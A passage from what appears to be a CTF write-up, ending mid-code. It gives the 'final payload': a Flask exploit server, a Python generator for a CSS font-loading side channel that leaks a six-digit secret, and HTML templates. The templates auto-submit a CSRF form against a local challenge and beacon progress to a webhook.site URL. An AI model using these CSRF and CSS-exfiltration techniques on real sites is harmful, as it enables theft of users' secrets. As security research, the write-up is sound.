@simonedimaria for helping me with this research and keeping me sane. I‚Äôll probably write another blog post on other ways to exploit these findings :)</p><p>Also, I hope you enjoyed this little writeup-research :heart:</p><h2 id=final-payload><a class=full-clickable-heading href=#final-payload>Final payload</a></h2><h4 id=server-code><a class=full-clickable-heading href=#server-code>Server Code</a></h4><h5 id=serverpy><a class=full-clickable-heading href=#serverpy>server.py</a></h5><div class=highlight><pre tabindex=0 class=chroma><code class=language-py data-lang=py><span class=line><span class=cl><span class=kn>import</span> <span class=nn>string</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>random</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>flask</span> <span class=kn>import</span> <span class=n>Flask</span><span class=p>,</span> <span class=n>render_template</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>gen_css</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>app</span> <span class=o>=</span> <span class=n>Flask</span><span class=p>(</span><span class=vm>__name__</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>FLAG</span> <span class=o>=</span> <span class=s2>&#34;&#34;</span>
</span></span><span class=line><span class=cl><span class=n>URL</span> <span class=o>=</span> <span class=s2>&#34;http://localhost:1337&#34;</span>
</span></span><span class=line><span class=cl><span class=n>WEBHOOK</span> <span class=o>=</span> <span class=s2>&#34;http://webhook.site/5a046d8e-9d3c-42e2-a865-1ee6585527f9&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nd>@app.get</span><span class=p>(</span><span class=s2>&#34;/&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>index</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>render_template</span><span class=p>(</span><span class=s2>&#34;exploit.html&#34;</span><span class=p>,</span> <span class=n>webhook</span><span class=o>=</span><span class=n>WEBHOOK</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nd>@app.get</span><span class=p>(</span><span class=s2>&#34;/connection-pool&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>connection_palle</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>render_template</span><span class=p>(</span><span class=s2>&#34;connection-pool.html&#34;</span><span class=p>,</span> <span class=n>webhook</span><span class=o>=</span><span class=n>WEBHOOK</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nd>@app.get</span><span class=p>(</span><span class=s2>&#34;/csrf&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>csrf</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=k>with</span> <span class=nb>open</span><span class=p>(</span><span class=s2>&#34;exploit-css.html&#34;</span><span class=p>,</span> <span class=s2>&#34;r&#34;</span><span class=p>)</span> <span class=k>as</span> <span class=n>f</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>cssexploit</span> <span class=o>=</span> <span class=n>f</span><span class=o>.</span><span class=n>read</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>username</span> <span class=o>=</span><span class=s1>&#39;&#39;</span><span class=o>.</span><span class=n>join</span><span class=p>([</span><span class=n>random</span><span class=o>.</span><span class=n>choice</span><span class=p>(</span><span class=n>string</span><span class=o>.</span><span class=n>ascii_lowercase</span><span class=p>)</span> <span class=k>for</span> <span class=n>_</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>32</span><span class=p>)])</span>
</span></span><span class=line><span class=cl>    <span class=n>password</span> <span class=o>=</span> <span class=s1>&#39;&#39;</span><span class=o>.</span><span class=n>join</span><span class=p>([</span><span class=n>random</span><span class=o>.</span><span class=n>choice</span><span class=p>(</span><span class=n>string</span><span class=o>.</span><span class=n>digits</span><span class=p>)</span> <span class=k>for</span> <span class=n>_</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>6</span><span class=p>)])</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;user&#34;</span><span class=p>,</span> <span class=n>username</span><span class=p>,</span> <span class=s2>&#34;passw&#34;</span><span class=p>,</span> <span class=n>password</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>render_template</span><span class=p>(</span><span class=s2>&#34;csrf.html&#34;</span><span class=p>,</span> 
</span></span><span class=line><span class=cl>                           <span class=n>chall_url</span><span class=o>=</span><span class=n>URL</span><span class=p>,</span> 
</span></span><span class=line><span class=cl>                           <span class=n>css_payload</span><span class=o>=</span><span class=n>cssexploit</span><span class=p>,</span> 
</span></span><span class=line><span class=cl>                           <span class=n>random_username</span><span class=o>=</span><span class=n>username</span><span class=p>,</span> 
</span></span><span class=line><span class=cl>                           <span class=n>random_password</span><span class=o>=</span><span class=n>password</span><span class=p>,</span>
</span></span><span class=line><span class=cl>                           <span class=n>webhook</span><span class=o>=</span><span class=n>WEBHOOK</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=vm>__name__</span> <span class=o>==</span> <span class=s2>&#34;__main__&#34;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>app</span><span class=o>.</span><span class=n>run</span><span class=p>(</span><span class=s2>&#34;0.0.0.0&#34;</span><span class=p>,</span> <span class=mi>4004</span><span class=p>)</span>
</span></span></code></pre></div><h5 id=gen_csspy><a class=full-clickable-heading href=#gen_csspy>gen_css.py</a></h5><div class=highlight><pre tabindex=0 class=chroma><code class=language-py data-lang=py><span class=line><span class=cl><span class=kn>import</span> <span class=nn>secrets</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>random</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>urllib.parse</span> <span class=kn>import</span> <span class=n>quote</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>CHARSET</span> <span class=o>=</span> <span class=s2>&#34;ABCDEF0987654321&#34;</span> 
</span></span><span class=line><span class=cl><span class=n>URL</span> <span class=o>=</span> <span class=s2>&#34;http://localhost:1337&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>generate_fonts_part_2</span><span class=p>(</span><span class=n>charset</span><span class=p>:</span> <span class=nb>str</span><span class=p>)</span> <span class=o>-&gt;</span> <span class=nb>str</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>final</span> <span class=o>=</span> <span class=s2>&#34;&#34;</span>
</span></span><span class=line><span class=cl>    <span class=n>progr</span> <span class=o>=</span> <span class=nb>round</span><span class=p>(</span><span class=mi>100</span> <span class=o>/</span> <span class=nb>len</span><span class=p>(</span><span class=n>charset</span><span class=p>),</span> <span class=mi>2</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>x</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>6</span><span class=p>):</span> 
</span></span><span class=line><span class=cl>        <span class=n>part</span> <span class=o>=</span> <span class=s2>&#34;&#34;</span>
</span></span><span class=line><span class=cl>        <span class=k>for</span> <span class=n>y</span><span class=p>,</span> <span class=n>c</span> <span class=ow>in</span> <span class=nb>enumerate</span><span class=p>(</span><span class=n>charset</span><span class=p>):</span>
</span></span><span class=line><span class=cl>            <span class=n>part</span> <span class=o>+=</span> <span class=sa>f</span><span class=s2>&#34;&#34;&#34;    </span><span class=si>{</span><span class=n>progr</span><span class=o>*</span><span class=n>y</span><span class=si>}</span><span class=s2>% </span><span class=se>{{</span><span class=s2> font-family: rest; </span><span class=se>}}</span><span class=s2>
</span></span></span><span class=line><span class=cl><span class=s2>    </span><span class=si>{</span><span class=n>progr</span><span class=o>*</span><span class=n>y</span> <span class=o>+</span> <span class=mi>5</span><span class=si>}</span><span class=s2>% </span><span class=se>{{</span><span class=s2> font-family: has_</span><span class=si>{</span><span class=n>x</span><span class=si>}</span><span class=s2>_</span><span class=si>{</span><span class=n>c</span><span class=o>.</span><span class=n>upper</span><span class=p>()</span><span class=si>}</span><span class=s2>, rest; </span><span class=se>}}</span><span class=s2>
</span></span></span><span class=line><span class=cl><span class=s2>&#34;&#34;&#34;</span>
</span></span><span class=line><span class=cl>        <span class=n>final</span> <span class=o>+=</span> <span class=sa>f</span><span class=s2>&#34;@keyframes trychar_</span><span class=si>{</span><span class=n>x</span><span class=si>}</span><span class=s2> </span><span class=se>{{\n</span><span class=si>{</span><span class=n>part</span><span class=si>}</span><span class=se>\n}}\n</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>final</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>generate_set_animation_payload</span><span class=p>(</span><span class=n>charset</span><span class=p>:</span> <span class=nb>str</span><span class=p>)</span> <span class=o>-&gt;</span> <span class=nb>str</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>result</span> <span class=o>=</span> <span class=s2>&#34;&#34;</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>x</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>6</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=n>result</span> <span class=o>+=</span> <span class=sa>f</span><span class=s2>&#34;&#34;&#34;
</span></span></span><span class=line><span class=cl><span class=s2>.code-digit:nth-child(</span><span class=si>{</span><span class=n>x</span><span class=o>+</span><span class=mi>1</span><span class=si>}</span><span class=s2>) </span><span class=se>{{</span><span class=s2>
</span></span></span><span class=line><span class=cl><span class=s2>    animation: trychar_</span><span class=si>{</span><span class=n>x</span><span class=si>}</span><span class=s2> step-end 2s 0s;
</span></span></span><span class=line><span class=cl><span class=s2>    animation-iteration-count: 1;
</span></span></span><span class=line><span class=cl><span class=s2>    animation-delay: </span><span class=si>{</span><span class=n>x</span><span class=o>*</span><span class=mi>10</span><span class=o>+</span><span class=mi>4</span><span class=si>}</span><span class=s2>s
</span></span></span><span class=line><span class=cl><span class=s2></span><span class=se>}}</span><span class=s2>
</span></span></span><span class=line><span class=cl><span class=s2>&#34;&#34;&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>result</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>generate_font_face_part</span><span class=p>(</span><span class=n>charset</span><span class=p>:</span> <span class=nb>str</span><span class=p>)</span> <span class=o>-&gt;</span> <span class=nb>str</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>font_face_part</span> <span class=o>=</span> <span class=s2>&#34;&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>6</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=k>for</span> <span class=n>x</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=nb>len</span><span class=p>(</span><span class=n>charset</span><span class=p>)):</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            <span class=n>url_string</span> <span class=o>=</span> <span class=s1>&#39;,&#39;</span><span class=o>.</span><span class=n>join</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;url(</span><span class=si>{</span><span class=n>URL</span><span class=si>}</span><span class=s2>/</span><span class=si>{</span><span class=n>random</span><span class=o>.</span><span class=n>getrandbits</span><span class=p>(</span><span class=mi>32</span><span class=p>)</span><span class=si>}</span><span class=s2>.something?random=</span><span class=si>{</span><span class=n>random</span><span class=o>.</span><span class=n>getrandbits</span><span class=p>(</span><span class=mi>32</span><span class=p>)</span><span class=si>}</span><span class=s2>)&#34;</span> <span class=k>for</span> <span class=n>_</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>((</span><span class=n>x</span><span class=o>+</span><span class=mi>3</span><span class=p>)))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            <span class=n>font_face_part</span> <span class=o>+=</span> <span class=sa>f</span><span class=s2>&#34;&#34;&#34;
</span></span></span><span class=line><span class=cl><span class=s2>@font-face</span><span class=se>{{</span><span class=s2>
</span></span></span><span class=line><span class=cl><span class=s2>    font-family:has_</span><span class=si>{</span><span class=n>i</span><span class=si>}</span><span class=s2>_</span><span class=si>{</span><span class=n>charset</span><span class=p>[</span><span class=n>x</span><span class=p>]</span><span class=o>.</span><span class=n>upper</span><span class=p>()</span><span class=si>}</span><span class=s2>;
</span></span></span><span class=line><span class=cl><span class=s2>    src: </span><span class=si>{</span><span class=n>url_string</span><span class=si>}</span><span class=s2>;
</span></span></span><span class=line><span class=cl><span class=s2>    unicode-range:U+00</span><span class=si>{</span><span class=nb>hex</span><span class=p>(</span><span class=nb>ord</span><span class=p>(</span><span class=n>charset</span><span class=p>[</span><span class=n>x</span><span class=p>]</span><span class=o>.</span><span class=n>upper</span><span class=p>()))[</span><span class=mi>2</span><span class=p>:]</span><span class=si>}</span><span class=s2>;
</span></span></span><span class=line><span class=cl><span class=s2></span><span class=se>}}</span><span class=s2>
</span></span></span><span class=line><span class=cl><span class=s2>    &#34;&#34;&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>font_face_part</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>TEMPLATE</span> <span class=o>=</span> <span class=sa>f</span><span class=s2>&#34;&#34;&#34;&lt;style&gt;
</span></span></span><span class=line><span class=cl><span class=s2>
</span></span></span><span class=line><span class=cl><span class=s2>#secret-form</span><span class=se>{{</span><span class=s2>
</span></span></span><span class=line><span class=cl><span class=s2>    display: block !important;
</span></span></span><span class=line><span class=cl><span class=s2></span><span class=se>}}</span><span class=s2>
</span></span></span><span class=line><span class=cl><span class=s2>
</span></span></span><span class=line><span class=cl><span class=s2></span><span class=si>{</span><span class=n>generate_font_face_part</span><span class=p>(</span><span class=n>CHARSET</span><span class=p>)</span><span class=si>}</span><span class=s2>
</span></span></span><span class=line><span class=cl><span class=s2>
</span></span></span><span class=line><span class=cl><span class=s2></span><span class=si>{</span><span class=n>generate_set_animation_payload</span><span class=p>(</span><span class=n>CHARSET</span><span class=p>)</span><span class=si>}</span><span class=s2>
</span></span></span><span class=line><span class=cl><span class=s2>
</span></span></span><span class=line><span class=cl><span class=s2></span><span class=si>{</span><span class=n>generate_fonts_part_2</span><span class=p>(</span><span class=n>CHARSET</span><span class=p>)</span><span class=si>}</span><span class=s2>
</span></span></span><span class=line><span class=cl><span class=s2>
</span></span></span><span class=line><span class=cl><span class=s2>&lt;/style&gt;
</span></span></span><span class=line><span class=cl><span class=s2>&#34;&#34;&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>with</span> <span class=nb>open</span><span class=p>(</span><span class=s2>&#34;exploit-css.html&#34;</span><span class=p>,</span> <span class=s2>&#34;w&#34;</span><span class=p>)</span> <span class=k>as</span> <span class=n>f</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>f</span><span class=o>.</span><span class=n>write</span><span class=p>(</span><span class=n>TEMPLATE</span><span class=p>)</span>
</span></span></code></pre></div><h4 id=templates><a class=full-clickable-heading href=#templates>Templates</a></h4><h5 id=csrfhtml><a class=full-clickable-heading href=#csrfhtml>csrf.html</a></h5><div class=highlight><pre tabindex=0 class=chroma><code class=language-html data-lang=html><span class=line><span class=cl><span class=cp>&lt;!DOCTYPE html&gt;</span>
</span></span><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>html</span> <span class=na>lang</span><span class=o>=</span><span class=s>&#34;en&#34;</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>head</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>    <span class=p>&lt;</span><span class=nt>meta</span> <span class=na>charset</span><span class=o>=</span><span class=s>&#34;UTF-8&#34;</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>    <span class=p>&lt;</span><span class=nt>meta</span> <span class=na>name</span><span class=o>=</span><span class=s>&#34;viewport&#34;</span> <span class=na>content</span><span class=o>=</span><span class=s>&#34;width=device-width, initial-scale=1.0&#34;</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>    <span class=p>&lt;</span><span class=nt>title</span><span class=p>&gt;</span>CSRF<span class=p>&lt;/</span><span class=nt>title</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl><span class=p>&lt;/</span><span class=nt>head</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>body</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>    <span class=p>&lt;</span><span class=nt>div</span> <span class=na>class</span><span class=o>=</span><span class=s>&#34;container text-center&#34;</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>        <span class=p>&lt;</span><span class=nt>div</span> <span class=na>class</span><span class=o>=</span><span class=s>&#34;row justify-content-center mb-3&#34;</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>            <span class=p>&lt;</span><span class=nt>div</span> <span class=na>class</span><span class=o>=</span><span class=s>&#34;col-10 col-md-6&#34;</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>                <span class=p>&lt;</span><span class=nt>h5</span><span class=p>&gt;</span>Input your secret here:<span class=p>&lt;/</span><span class=nt>h5</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>                
</span></span><span class=line><span class=cl>                <span class=p>&lt;</span><span class=nt>form</span> <span class=na>action</span><span class=o>=</span><span class=s>&#34;{{ chall_url }}/set-secret&#34;</span> <span class=na>method</span><span class=o>=</span><span class=s>&#34;POST&#34;</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>                    <span class=p>&lt;</span><span class=nt>input</span> <span class=na>id</span><span class=o>=</span><span class=s>&#34;input&#34;</span> <span class=na>class</span><span class=o>=</span><span class=s>&#34;form-control&#34;</span> <span class=na>name</span><span class=o>=</span><span class=s>&#34;code&#34;</span> <span class=na>rows</span><span class=o>=</span><span class=s>&#34;2&#34;</span> <span class=na>value</span><span class=o>=</span><span class=s>&#34;{{ random_password }}&#34;</span><span class=p>&gt;&lt;/</span><span class=nt>input</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>                    <span class=p>&lt;</span><span class=nt>input</span> <span class=na>id</span><span class=o>=</span><span class=s>&#34;input&#34;</span> <span class=na>class</span><span class=o>=</span><span class=s>&#34;form-control&#34;</span> <span class=na>name</span><span class=o>=</span><span class=s>&#34;username&#34;</span> <span class=na>rows</span><span class=o>=</span><span class=s>&#34;2&#34;</span> <span class=na>value</span><span class=o>=</span><span class=s>&#34;{{ random_username }}&#34;</span><span class=p>&gt;&lt;/</span><span class=nt>input</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>                    <span class=p>&lt;</span><span class=nt>input</span> <span class=na>id</span><span class=o>=</span><span class=s>&#34;input&#34;</span> <span class=na>class</span><span class=o>=</span><span class=s>&#34;form-control&#34;</span> <span class=na>name</span><span class=o>=</span><span class=s>&#34;secret&#34;</span> <span class=na>rows</span><span class=o>=</span><span class=s>&#34;2&#34;</span> <span class=na>value</span><span class=o>=</span><span class=s>&#34;{{ css_payload }}&#34;</span><span class=p>&gt;&lt;/</span><span class=nt>input</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>                    <span class=p>&lt;</span><span class=nt>button</span> <span class=na>type</span><span class=o>=</span><span class=s>&#34;submit&#34;</span> <span class=na>class</span><span class=o>=</span><span class=s>&#34;btn btn-primary mt-3&#34;</span><span class=p>&gt;</span>Submit<span class=p>&lt;/</span><span class=nt>button</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>                <span class=p>&lt;/</span><span class=nt>form</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>            <span class=p>&lt;/</span><span class=nt>div</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>        <span class=p>&lt;/</span><span class=nt>div</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>        <span class=p>&lt;</span><span class=nt>div</span> <span class=na>class</span><span class=o>=</span><span class=s>&#34;row justify-content-center&#34;</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>            <span class=p>&lt;</span><span class=nt>div</span> <span class=na>class</span><span class=o>=</span><span class=s>&#34;col-10 col-md-6&#34;</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>                <span class=p>&lt;</span><span class=nt>div</span> <span class=na>class</span><span class=o>=</span><span class=s>&#34;secret-container border p-3&#34;</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>                    <span class=p>&lt;</span><span class=nt>div</span> <span class=na>class</span><span class=o>=</span><span class=s>&#34;hover-text&#34;</span><span class=p>&gt;</span>Hover me to show the secret<span class=p>&lt;/</span><span class=nt>div</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>                    <span class=p>&lt;</span><span class=nt>div</span> <span class=na>class</span><span class=o>=</span><span class=s>&#34;secret-div&#34;</span> <span class=na>id</span><span class=o>=</span><span class=s>&#34;secret&#34;</span><span class=p>&gt;&lt;/</span><span class=nt>div</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>                <span class=p>&lt;/</span><span class=nt>div</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>            <span class=p>&lt;/</span><span class=nt>div</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>        <span class=p>&lt;/</span><span class=nt>div</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>    <span class=p>&lt;/</span><span class=nt>div</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>script</span><span class=p>&gt;</span> 
</span></span><span class=line><span class=cl>    <span class=kr>const</span> <span class=nx>sleep</span> <span class=o>=</span> <span class=p>(</span><span class=nx>ms</span><span class=p>)</span> <span class=p>=&gt;</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=k>new</span> <span class=nb>Promise</span><span class=p>(</span><span class=nx>resolve</span> <span class=p>=&gt;</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=nx>setTimeout</span><span class=p>(</span><span class=nx>resolve</span><span class=p>,</span> <span class=nx>ms</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=p>});</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=kd>function</span> <span class=nx>popup</span><span class=p>(</span><span class=nx>url</span><span class=p>){</span>
</span></span><span class=line><span class=cl>        <span class=kd>let</span> <span class=nx>w</span> <span class=o>=</span> <span class=nb>window</span><span class=p>.</span><span class=nx>open</span><span class=p>(</span><span class=nx>url</span><span class=p>,</span> <span class=s2>&#34;WINBG&#34;</span><span class=p>,</span> <span class=sb>`width=1000, height= 480, left=0, top=0`</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=nx>w</span><span class=p>.</span><span class=nx>blur</span><span class=p>();</span>
</span></span><span class=line><span class=cl>        <span class=nb>window</span><span class=p>.</span><span class=nx>focus</span><span class=p>();</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=nx>w</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=kr>async</span> <span class=kd>function</span> <span class=nx>csrf_submit</span><span class=p>(){</span>
</span></span><span class=line><span class=cl>        <span class=kr>await</span> <span class=nx>sleep</span><span class=p>(</span><span class=mi>50</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=nb>document</span><span class=p>.</span><span class=nx>forms</span><span class=p>[</span><span class=mi>0</span><span class=p>].</span><span class=nx>submit</span><span class=p>();</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=nx>fetch</span><span class=p>(</span><span class=s2>&#34;{{ webhook }}?DOING_CSRF&#34;</span><span class=p>,</span> <span class=p>{</span><span class=nx>mode</span><span class=o>:</span> <span class=s2>&#34;no-cors&#34;</span><span class=p>})</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=nx>csrf_submit</span><span class=p>();</span>    
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=p>&lt;/</span><span class=nt>script</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl><span class=p>&lt;/</span><span class=nt>body</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl><span class=p>&lt;/</span><span class=nt>html</span><span class=p>&gt;</span>
</span></span></code></pre></div><h5 id=exploithtml><a class=full-clickable-heading href=#exploithtml>exploit.html</a></h5><div class=highlight><pre tabindex=0 class=chroma><code class=language-html data-lang=html><span class=line><span class=cl><span class=cp>&lt;!DOCTYPE html&gt;</span>
</span></span><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>html</span> <span class=na>lang</span><span class=o>=</span><span class=s>&#34;en&#34;</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>head</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>    <span class=p>&lt;</span><span class=nt>meta</span> <span class=na>charset</span><span class=o>=</span><span class=s>&#34;UTF-8&#34;</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>    <span class=p>&lt;</span><span class=nt>meta</span> <span class=na>name</span><span class=o>=</span><span class=s>&#34;viewport&#34;</span> <span class=na>content</span><span class=o>=</span><span class=s>&#34;width=device-width, initial-scale=1.0&#34;</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>    <span class=p>&lt;</span><span class=nt>title</span><span class=p>&gt;</span>Document<span class=p>&lt;/</span><span class=nt>title</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl><span class=p>&lt;/</span><span class=nt>head</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>body</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>    <span class=p>&lt;</span><span class=nt>script</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=kd>function</span> <span class=nx>popup</span><span class=p>(</span><span class=nx>url</span><span class=p>){</span>
</span></span><span class=line><span class=cl>            <span class=kd>let</span> <span class=nx>w</span> <span class=o>=</span> <span class=nb>window</span><span class=p>.</span><span class=nx>open</span><span class=p>(</span><span class=nx>url</span><span class=p>,</span> <span class=s2>&#34;s1&#34;</span><span class=p>,</span> <span class=s2>&#34;width= 640, height= 480, left=0, top=0, resizable=yes, toolbar=no, location=no, directories=no, status=no, menubar=no, scrollbars=yes, resizable=no, copyhistory=no&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=nx>w</span><span class=p>.</span><span class=nx>blur</span><span class=p>();</span>
</span></span><span class=line><span class=cl>            <span class=nb>window</span><span class=p>.</span><span class=nx>focus</span><span class=p>();</span>
</span></span><span class=line><span class=cl>            <span class=k>return</span> <span class=nx>w</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=kr>const</span> <span class=nx>sleep</span> <span class=o>=</span> <span class=p>(</span><span class=nx>ms</span><span class=p>)</span> <span class=p>=&gt;</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=k>return</span> <span class=k>new</span> <span class=nb>Promise</span><span class=p>(</span><span class=nx>resolve</span> <span class=p>=&gt;</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>                <span class=nx>setTimeout</span><span class=p>(</span><span class=nx>resolve</span><span class=p>,</span> <span class=nx>ms</span><span class=p>);</span>
</span></span><span class=line><span class=cl>            <span class=p>});</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=kr>async</span> <span class=kd>function</span> <span class=nx>main</span><span class=p>(){</span>
</span></span><span class=line><span class=cl>            <span class=nx>fetch</span><span class=p>(</span><span class=s2>&#34;{{ webhook }}?STARTING&#34;</span><span class=p>,</span> <span class=p>{</span><span class=nx>mode</span><span class=o>:</span> <span class=s2>&#34;no-cors&#34;</span><span class=p>})</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            <span class=kr>await</span> <span class=nx>sleep</span><span class=p>(</span><span class=mi>2000</span><span class=p>);</span>
</span></span><span class=line><span class=cl>            <span class=nx>w1</span> <span class=o>=</span> <span class=nx>popup</span><span class=p>(</span><span class=sb>`/csrf`</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            <span class=kr>await</span> <span class=nx>sleep</span><span class=p>(</span><span class=mi>1000</span><span class=p>);</span> <span class=c1>// wait for form submission
</span></span></span><span class=line><span class=cl><span class=c1></span>            
